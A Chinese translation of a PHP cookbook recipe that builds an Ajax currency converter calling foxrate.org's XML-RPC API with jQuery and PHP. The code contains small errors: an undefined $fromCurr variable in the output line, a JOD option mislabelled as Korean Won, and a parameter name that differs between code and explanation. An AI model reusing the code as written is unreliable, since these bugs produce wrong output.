在本示例中，我们将看到如何使用 Ajax 和 PHP 转换货币。在本示例中，我们将使用 foxrate.org 提供的 API。Forxrate.org 以 XML-RPC 格式提供了 Web 服务。我们在本示例中使用了 XML-RPC Web 服务。

## 入门

Foxrate.org 的货币转换 API 位于：[`foxrate.org/rpc/`](http://foxrate.org/rpc/)。XML-RPC 调用的方法名是*foxrate.currencyConvert*。可以传递给此函数的参数是：

+   从货币这是原始货币金额所在的货币代码。示例可以是美元或英镑。货币代码列表可以在这里找到：[`en.wikipedia.org/wiki/ISO_4217`](http://en.wikipedia.org/wiki/ISO_4217)。

+   目标货币这是需要将金额转换为的目标货币的货币代码。

+   金额方法调用的第三个参数是需要从原始货币转换为目标货币的金额。

现在，让我们看看对`foxrate.currencyConvert`的 XML-RPC 调用的响应是什么样的：

**<methodResponse>**

**<params>**

**<param>**

**<value>**

**<struct>**

**<member><name>flerror</name><value><int>0</int></value></member>**

**<member><name>amount</name><value><double>33.016</double></value></member>**

**<member><name>message</name><value><string>cached</string></value></member>**

**</struct>**

**</value>**

**</param>**

**</params>**

**</methodResponse>**

正如你所看到的，它的 XML-RPC 响应格式有三个参数*flerror, amount*和*message*。*flerror*包含值 1，如果调用中有错误，如果调用成功，则为 0。*amount*是转换后的金额，*message*包含错误消息或与调用相关的其他有用消息。

## 如何做...

现在，让我们看看这个工具的界面。有一个文本框，你可以在里面输入需要转换成美元的金额。第二个是下拉选择框，你可以从中选择要将金额从哪种货币转换为美元。为了演示目的，在我们的示例中，我们只使用了一些流行的货币。

![如何做...](https://github.com/OpenDocCN/freelearn-php-zh/raw/master/docs/php-ajax-cb/img/3081_08_09.jpg)

让我们来看看创建这个使用 foxrate.org 的 API 转换货币的工具的代码。首先，让我们来看看`example-9.html`文件。

```php
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<style media="all" type="text/css">
html, body {
font-family:Arial, Helvetica, sans-serif;
}
#container{
margin:0px auto;
width:420px;
}
#output {
font-weight:bold;
color:#F00;
}
</style>
<script type="text/javascript" src="https://Ajax.googleapis.com/Ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript" language="javascript">
// currency convertor using
$(document).ready(function(){
$("#calculate").click(function()
{
var from_cur = $('#fromcurrency').val();
var amt = $('#fromaount').val();
if(isNaN(amt) || $.trim(amt)=='')
{
alert('Please enter a valid amount');
return false;
}
//to show the loading image
$('#output').html("Please wait...");
//
$('#output').load('convert-currency.php?from_curr='+from_cur+'&amount='+amt);
});
});
</script>
<title>Currency Currency Conversion Tool</title>
</head>
<body>
<div id="container">
<h2>Convert any other currency to USD</h2>
<p>
Amount : <input type="text" name="fromaount" id="fromaount" value="1">
<br/>
<br>
Currency:
<select name="fromcurrency" size="10" id="fromcurrency">
<option value="AUD" >Australian Dollar (AUD)</option>
<option value="GBP" >British Pound (GBP)</option>
<option value="BND" >Brunei Dollar (BND)</option>
<option value="JPY">Japanese Yen (JPY)</option>
<option value="JOD" >Korean Won (KRW)</option>
<option value="KWD" selected >Kuwaiti Dinar (KWD)</option>
<option value="NZD">New Zealand Dollar (NZD)</option>
<option value="AED">UAE Dirham (AED)</option>
</select>
<br/>
<br/>
&nbsp;&nbsp;<input type="submit" name="calculate" id="calculate" value="Convert to USD"/><br/><br/>
&nbsp;&nbsp;<span id="output" >Results Will be displayed here</span>
</p>
</div>
</body>
</html>

```

正如你在这段代码中看到的，有一个 Ajax 调用到`convert-currency.php`，使用 jQuery 的`load()`函数。让我们看看`convert-currency.php`的代码，它使用 PHP 的`xml-rpc`函数调用 foxrate.org 的 API。

```php
<?php
//define the constant for targetted currency
define('TO_CURRENCY','USD');
//get values of amount and from currency
$amount=$_GET['amount'];
$from_curr =$_GET['from_curr'];
//check for valid amount value
if(!is_numeric($amount))
{
die("Invalid Amount");
}
//convert currency function
$response=convert_currency($from_curr,TO_CURRENCY,$amount);
//print_r($response);
if($response['flerror']==1)
echo "ERROR : ".$response['message'];
else
echo "$amount $fromCurr = ".number_format($response['amount'],2)." USD";
//function defined to convert the currency
function convert_currency($from_currency,$to_currency,$amount)
{
//encode the xml rpc request
$request = xmlrpc_encode_request("foxrate.currencyConvert", array($from_currency,$to_currency,$amount));
//create the stream content
$context = stream_context_create(array('http' => array(
'method' => "POST",
'header' => "Content-Type: text/xml",
'content' => $request
)));
//get the response here
$file = file_get_contents("http://foxrate.org/rpc/", false, $context);
$response = xmlrpc_decode($file);
if (xmlrpc_is_fault($response)) {
die('xmlrpc: '.$response['faultString'].' ('.$response['faultCode'].')');
} else {
return $response;
}
}
?>

```

## 它是如何工作的...

从`example-9.html`开始，当你点击“转换为美元”按钮时，它将调用这个按钮的事件处理程序：

```php
$("#calculate").click(function() {

```

在这个函数中，我们首先验证金额是否是有效的数字。为此，JavaScript 中有一个名为`isNaN()`的函数，用于检查值是否是合法数字或非数字。这意味着*isNan*指的是非数字。

```php
if(isNaN(amt) || $.trim(amt)=='')
{

```

现在，让我们看看如何使用 jQuery 的`load()`函数来使用 Ajax。

```php
$('#output').load('convert-currency.php?fromcurr='+from_cur+'&amount='+amt);

```

上面的代码通过`load()`函数的括号中的 URL 进行 Ajax 调用，响应将被注入到 ID 为`output`的 div 中，即`#output`。

现在，让我们试着理解`convert-currency.php`文件的代码。

```php
$response=convert_currency($from_curr,TO_CURRENCY,$amount);

```

这一行调用了一个名为`convert_currency()`的用户定义函数。这个函数接受三个参数，第一个`$from_curr`是需要转换的货币。`TO_CURRRNCY`是定义为*USD*值的常量，`$amount`是需要转换的金额。现在，让我们看看`convert_currency()`函数。

为了将 XML-RPC 请求编码为 XML-RPC 格式，我们通常使用`xmlrpc_encode_request()`函数，它有两个参数。第一个是要调用的方法的名称，第二个是 XML-RPC 调用的参数。

```php
$request = xmlrpc_encode_request("foxrate.currencyConvert", array($from_currency,$to_currency,$amount));

```

现在，下一步是创建流上下文，请求方法指定为 foxrate.org 指定的 POST。

```php
$context = stream_context_create(array('http' => array(
'method' => "POST",
'header' => "Content-Type: text/xml",
'content' => $request
)));

```

创建内容后，我们在`$context`变量中有上下文资源，可以与`file_get_contents()`函数一起使用：

```php
$file = file_get_contents("http://foxrate.org/rpc/", false, $context);

```

`file_get_contents()`的第二个参数是指定是否在`php.ini`中设置了`include_path`值。我们在这里将其传递为`false`。`$file`变量包含 XML-RPC 格式的 XML 响应。现在，我们需要将其解码为本机 PHP 类型，`xmlrpc_decode()`将 XML-RPC 响应解码为 PHP 类型变量。

```php
$response = xmlrpc_decode($file);

```

在将响应解码为 PHP 之后，`var_dump($response)`给出以下示例输出：

**array(3) {**

["flerror"]=>**

**int(0)**

**["amount"]=>**

**float(33.016)**

**["message"]=>**

**string(6) "cached**"

**}**

在这里，您可以看到响应被转换为 PHP 本机类型变量。

最后，这个`$response`变量从这个函数返回，并使用`echo`语句在所需的输出中打印出来。
